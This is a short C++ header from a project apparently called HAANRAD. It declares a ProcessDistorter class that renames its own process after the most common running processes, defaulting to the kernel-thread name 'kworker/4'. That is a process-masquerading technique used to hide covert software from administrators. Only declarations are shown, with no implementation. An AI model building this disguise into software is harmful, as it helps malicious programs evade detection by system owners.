//
// Created by bensoer on 31/10/16.
//

#ifndef HAANRAD_PROCESSDISTORTER_H
#define HAANRAD_PROCESSDISTORTER_H

#include<string>

using namespace std;

//Process distorter at certain set time intervals? should check the ratio count of the number of currently running
//processes and change its name based on the most popular processes
class ProcessDistorter {

private:

    string currentProcessName;
    string previousProcessName;
    string defaultName = "kworker/4";

    string * findPopularProcessName();

    bool useDefaultOnFail;
    bool appendHint;
    char ** argv;

public:
    ProcessDistorter(char * argv[], bool useDefaultOnFail, bool appendHint);

    void setProcessName(string name);

    void determineProcessName();
};


#endif //HAANRAD_PROCESSDISTORTER_H
